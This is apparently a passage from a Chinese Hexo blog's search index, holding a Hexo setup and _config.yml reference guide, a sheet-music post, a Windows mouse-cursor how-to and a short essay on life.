href="https://github.com/">Github</a>，注册一个账号，已经有账号的直接登录就可以了。</p><p>新建一个仓库，名字自己取一个，如果你想用 Github Pages ，可以把名字写成 username.github.io 。</p><h2 id="获取-ssh-key"><a href="#获取-ssh-key" class="headerlink" title="获取 ssh key"></a>获取 ssh key</h2><p>桌面空白处邮件，点击” Git Bash Here “，输入&#96;&#96;</p><p>安装插件 <code>hexo-deployer-git</code> 并完成相关配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在博客根目录下的 <code>_config.yml</code> 修改</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span> <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> git  <span class="token key atrule">repo</span><span class="token punctuation">:</span> <span class="token comment">#你的仓库地址，如git@github.com:xxx/xxx.github.io.git</span>  <span class="token key atrule">branch</span><span class="token punctuation">:</span> main <span class="token comment">#也可以是master</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="配置（根目录）"><a href="#配置（根目录）" class="headerlink" title="配置（根目录）"></a>配置（根目录）</h1><h2 id="网站（Site）"><a href="#网站（Site）" class="headerlink" title="网站（Site）"></a>网站（Site）</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>title</code></td><td align="left">网站标题</td></tr><tr><td align="left"><code>subtitle</code></td><td align="left">网站副标题</td></tr><tr><td align="left"><code>description</code></td><td align="left">网站描述</td></tr><tr><td align="left"><code>keywords</code></td><td align="left">网站的关键词。支持多个关键词。</td></tr><tr><td align="left"><code>author</code></td><td align="left">你的名字</td></tr><tr><td align="left"><code>language</code></td><td align="left">网站使用的语言。对于简体中文，不同的主题需要设置成不同的值，请参考你的主题文档设置，常见的有<code>zh-Hans</code>和 <code>zh-CN</code>。</td></tr><tr><td align="left"><code>timezone</code></td><td align="left">网站时区。Hexo 默认使用你电脑的时区。请参考<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones">时区列表</a> 进行设置，如 <code>America/New_York</code> 和 <code>UTC</code> 。对于中国大陆地区一般可以使用 <code>Asia/Shanghai</code>。</td></tr></tbody></table><h2 id="网址（URL）"><a href="#网址（URL）" class="headerlink" title="网址（URL）"></a>网址（URL）</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>url</code></td><td align="left">网址, 必须以<code>http://</code> 或 <code>https://</code> 开头</td><td align="left"></td></tr><tr><td align="left"><code>root</code></td><td align="left">网站根目录</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">文章的链接格式</td><td align="left"><code>:year/:month/:day/:title/</code></td></tr><tr><td align="left"><code>permalink_defaults</code></td><td align="left">永久链接中各部分的默认值</td><td align="left"></td></tr><tr><td align="left"><code>pretty_urls</code></td><td align="left">改写<a href="https://hexo.io/zh-cn/docs/variables"><code>permalink</code></a> 的值来美化 URL</td><td align="left"></td></tr><tr><td align="left"><code>pretty_urls.trailing_index</code></td><td align="left">是否在永久链接中保留尾部的<code>index.html</code>，设置为 <code>false</code> 时去除</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>pretty_urls.trailing_html</code></td><td align="left">是否在永久链接中保留尾部的<code>.html</code>, 设置为 <code>false</code> 时去除 (<em>对尾部的 <code>index.html</code>无效</em>)</td><td align="left"><code>true</code></td></tr></tbody></table><blockquote><p>网站存放在子目录</p><p>如果你的网站存放在子目录中，例如 <code>http://example.com/blog</code>，则请将你的 <code>url</code> 设为 <code>http://example.com/blog</code> 并把 <code>root</code> 设为 <code>/blog/</code>。</p></blockquote><p>例如：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># 比如，一个页面的永久链接是 http://example.com/foo/bar/index.html</span><span class="token key atrule">pretty_urls</span><span class="token punctuation">:</span>  <span class="token key atrule">trailing_index</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token comment"># 此时页面的永久链接会变为 http://example.com/foo/bar/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果你是用 Github Pages 并且没有自定义域名，请把 <code>url</code> 设为 <code>https://username.github.io</code> 或 <code>https://username.github.io/project</code></p></blockquote><h2 id="目录（Directory）"><a href="#目录（Directory）" class="headerlink" title="目录（Directory）"></a>目录（Directory）</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>source_dir</code></td><td align="left">资源文件夹，这个文件夹用来存放内容。</td><td align="left"><code>source</code></td></tr><tr><td align="left"><code>public_dir</code></td><td align="left">公共文件夹，这个文件夹用于存放生成的站点文件。</td><td align="left"><code>public</code></td></tr><tr><td align="left"><code>tag_dir</code></td><td align="left">标签文件夹</td><td align="left"><code>tags</code></td></tr><tr><td align="left"><code>archive_dir</code></td><td align="left">归档文件夹</td><td align="left"><code>archives</code></td></tr><tr><td align="left"><code>category_dir</code></td><td align="left">分类文件夹</td><td align="left"><code>categories</code></td></tr><tr><td align="left"><code>code_dir</code></td><td align="left">Include code 文件夹，<code>source_dir</code> 下的子目录</td><td align="left"><code>downloads/code</code></td></tr><tr><td align="left"><code>i18n_dir</code></td><td align="left">国际化（i18n）文件夹</td><td align="left"><code>:lang</code></td></tr><tr><td align="left"><code>skip_render</code></td><td align="left">跳过指定文件的渲染。匹配到的文件将会被不做改动地复制到<code>public</code> 目录中。你可使用 glob表达式来匹配路径。</td><td align="left"></td></tr></tbody></table><p>例如：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">skip_render</span><span class="token punctuation">:</span> <span class="token string">"mypage/**/*"</span><span class="token comment"># 将会直接将 `source/mypage/index.html` 和 `source/mypage/code.js` 不做改动地输出到 'public' 目录</span><span class="token comment"># 你也可以用这种方法来跳过对指定文章文件的渲染</span><span class="token key atrule">skip_render</span><span class="token punctuation">:</span> <span class="token string">"_posts/test-post.md"</span><span class="token comment"># 这将会忽略对 'test-post.md' 的渲染</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>提示</p><p>如果你是新手 Hexo，没有必要修改这一部分的值，错误的修改会导致错误发生。</p></blockquote><h2 id="文章（Writing）"><a href="#文章（Writing）" class="headerlink" title="文章（Writing）"></a>文章（Writing）</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>new_post_name</code></td><td align="left">新文章的文件名称</td><td align="left">:title.md</td></tr><tr><td align="left"><code>default_layout</code></td><td align="left">预设布局</td><td align="left">post</td></tr><tr><td align="left"><code>auto_spacing</code></td><td align="left">在中文和英文之间加入空格</td><td align="left">false</td></tr><tr><td align="left"><code>titlecase</code></td><td align="left">把标题转换为 title case</td><td align="left">false</td></tr><tr><td align="left"><code>external_link</code></td><td align="left">在新标签中打开链接</td><td align="left"></td></tr><tr><td align="left"><code>external_link.enable</code></td><td align="left">在新标签中打开链接</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>external_link.field</code></td><td align="left">对整个网站（<code>site</code>）生效或仅对文章（<code>post</code>）生效</td><td align="left"><code>site</code></td></tr><tr><td align="left"><code>external_link.exclude</code></td><td align="left">需要排除的域名。主域名和子域名如<code>www</code> 需分别配置</td><td align="left"><code>[]</code></td></tr><tr><td align="left"><code>filename_case</code></td><td align="left">把文件名称转换为 (1) 小写或 (2) 大写</td><td align="left">0</td></tr><tr><td align="left"><code>render_drafts</code></td><td align="left">显示草稿</td><td align="left">false</td></tr><tr><td align="left"><code>post_asset_folder</code></td><td align="left">启动Asset 文件夹</td><td align="left">false</td></tr><tr><td align="left"><code>relative_link</code></td><td align="left">把链接改为与根目录的相对位址</td><td align="left">false</td></tr><tr><td align="left"><code>future</code></td><td align="left">显示未来的文章</td><td align="left">true</td></tr><tr><td align="left"><code>highlight</code></td><td align="left">代码块的设置, 你可以参考<a href="https://hexo.io/docs/syntax-highlight#Highlight-js">Highlight.js</a> 进行设置</td><td align="left"></td></tr><tr><td align="left"><code>prismjs</code></td><td align="left">代码块的设置, 你可以参考<a href="https://hexo.io/docs/syntax-highlight#PrismJS">PrismJS</a> 进行设置</td><td align="left"></td></tr></tbody></table><blockquote><p>相对地址</p><p>默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果你的网站域名为 <code>example.com</code>,你有一篇文章名为 <code>hello</code>，那么绝对链接可能像这样：<code>http://example.com/hello.html</code>，它是<strong>绝对</strong>于域名的。相对链接像这样：<code>/hello.html</code>，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p></blockquote><h2 id="分类-amp-标签"><a href="#分类-amp-标签" class="headerlink" title="分类 &amp; 标签"></a>分类 &amp; 标签</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>default_category</code></td><td align="left">默认分类</td><td align="left"><code>uncategorized</code></td></tr><tr><td align="left"><code>category_map</code></td><td align="left">分类别名</td><td align="left"></td></tr><tr><td align="left"><code>tag_map</code></td><td align="left">标签别名</td><td align="left"></td></tr></tbody></table><h2 id="日期-x2F-时间格式"><a href="#日期-x2F-时间格式" class="headerlink" title="日期 &#x2F; 时间格式"></a>日期 &#x2F; 时间格式</h2><p>Hexo 使用 Moment.js 来解析和显示时间。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>date_format</code></td><td align="left">日期格式</td><td align="left"><code>YYYY-MM-DD</code></td></tr><tr><td align="left"><code>time_format</code></td><td align="left">时间格式</td><td align="left"><code>HH:mm:ss</code></td></tr><tr><td align="left"><code>updated_option</code></td><td align="left">当 Front Matter 中没有指定<code>updated</code>时 <code>updated</code> 的取值</td><td align="left"><code>mtime</code></td></tr></tbody></table><blockquote><p><code>updated_option</code> 控制了当 Front Matter 中没有指定 <code>updated</code> 时，<code>updated</code> 如何取值：</p><ul><li><code>mtime</code>: 使用文件的最后修改时间。这是从 Hexo 3.0.0 开始的默认行为。</li><li><code>date</code>: 使用 <code>date</code> 作为 <code>updated</code> 的值。可被用于 Git 工作流之中，因为使用 Git 管理站点时，文件的最后修改日期常常会发生改变</li><li><code>empty</code>: 直接删除 <code>updated</code>。使用这一选项可能会导致大部分主题和插件无法正常工作。</li></ul></blockquote><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>per_page</code></td><td align="left">每页显示的文章量 (0 &#x3D; 关闭分页功能)</td><td align="left"><code>10</code></td></tr><tr><td align="left"><code>pagination_dir</code></td><td align="left">分页目录</td><td align="left"><code>page</code></td></tr></tbody></table><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>theme</code></td><td align="left">当前主题名称。值为<code>false</code>时禁用主题</td></tr><tr><td align="left"><code>theme_config</code></td><td align="left">主题的配置文件。在这里放置的配置会覆盖主题目录下的<code>_config.yml</code> 中的配置</td></tr><tr><td align="left"><code>deploy</code></td><td align="left">部署部分的设置</td></tr><tr><td align="left"><code>meta_generator</code></td><td align="left">Meta generator标签。 值为<code>false</code> 时 Hexo 不会在头部插入该标签</td></tr></tbody></table><h2 id="包括或不包括目录和文件"><a href="#包括或不包括目录和文件" class="headerlink" title="包括或不包括目录和文件"></a>包括或不包括目录和文件</h2><p>在 Hexo 配置文件中，通过设置 include&#x2F;exclude 可以让 Hexo 进行处理或忽略某些目录和文件夹。你可以使用glob 表达式对目录和文件进行匹配。</p><p><code>include</code> 和 <code>exclude</code> 选项只会应用到 <code>source/</code> ，而 <code>ignore</code> 选项会应用到所有文件夹.</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>include</code></td><td align="left">Hexo 默认会不包括<code>source/</code> 下的文件和文件夹（包括名称以下划线和 <code>.</code> 开头的文件和文件夹，Hexo 的 <code>_posts</code> 和 <code>_data</code> 等目录除外）。通过设置此字段将使 Hexo 处理他们并将它们复制到 <code>source</code> 目录下。</td></tr><tr><td align="left"><code>exclude</code></td><td align="left">Hexo 不包括<code>source/</code> 下的这些文件和目录</td></tr><tr><td align="left"><code>ignore</code></td><td align="left">Hexo 会忽略整个 Hexo 项目下的这些文件夹或文件</td></tr></tbody></table><blockquote><p>新手不建议更改此设置，可能出现问题</p></blockquote><h2 id="部署（Deployment）"><a href="#部署（Deployment）" class="headerlink" title="部署（Deployment）"></a>部署（Deployment）</h2><p>示例：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> git    <span class="token key atrule">repo</span><span class="token punctuation">:</span> git@github.com<span class="token punctuation">:</span>username/project.git<span class="token punctuation">,</span>main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
            <tag> Vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aliez简谱</title>
      <link href="/p/2022/41149534/"/>
      <url>/p/2022/41149534/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="/js/bai.js"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="https://music.163.com/outchain/player?type=2&id=1313052233&auto=0&height=66"></iframe><p><img src="http://www.xinyuepu.com/uploadfile/Public/Uploads/2017/05/20/3985055920384955c30.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 音乐曲谱 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐曲谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你更换电脑的鼠标指针</title>
      <link href="/p/2021/ea8fe0c4/"/>
      <url>/p/2021/ea8fe0c4/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>相信大家在使用电脑的时候会发现鼠标很单调，系统自带的只有黑白两个颜色的。</p><h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><blockquote><ol><li>打开链接 <a href="https://zhutix.com/tag/cursors/">https://zhutix.com/tag/cursors/</a></li><li>这里面有很多样式，你随便选一个，点进去，点下载</li><li>下载好之后，打开所在文件夹</li><li>使用压缩软件解压</li><li>进入解压出来的文件夹里，右击<code>右键安装.inf</code> ，点击安装，等待弹出窗口</li><li>最后选择你刚装的鼠标就OK了</li></ol></blockquote><p>是不是很简单？</p><p>经验+1，告辞（雾）</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个性化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>essay-life</title>
      <link href="/p/2021/3f81df2e/"/>
      <url>/p/2021/3f81df2e/</url>
      
        <content type="html"><![CDATA[<div class="ipage">    <div class="ititle">节选自《你若安好便是晴天》- 前言</div>    <div class="izhengwen">        <p>生活，有时感觉莫名的心烦。心烦的时候，最好的是沉默。</p>        <p>不必喝酒，出去走走，那小路和树林，那天空和海滩，那山风和淡云，就在身旁；</p>        <p>不必多怨，言多不逊，执一本书，在阳光下，微笑着面对一切，聆听一切；</p>        <p>不必伤怀，曲折有度，也许过了就算了，算了就消失了。</p>        <p>心烦，其实只是人的一种心情，看淡了，就习惯了。</p>        <p>生活，有时真的让人无语，令人心碎。</p>        <p>只是，既是自己选择的路，跪着也要走下去。</p>        <p>自己扛下的事，留着泪也要做好。</p>        <p>而有些情，舍不得也得放下，哪怕心再痛再苦。</p>        <p>其实，缘来缘去的个中滋味，只有岁月懂得，也只有自己深深懂得!</p>        <p>生活，有时候其实很简单。</p>        <p>生活，不过是一份发自内心的微笑；</p>        <p>是一种清淡如水的心态，对苦难，对幸福，对整个人生；</p>        <p>更是一本永远也读不完的书，有故事，有梦想，有难以言说的情怀。</p>        <p>倘若有天，在一个阳光温热的午后，树荫下，你会发现：净是如此美丽 !</p>        <p>亲爱的，很多时候不是生活抛弃了你，而是你抛弃了生活本身。</p>    </div></div>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 请相信生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
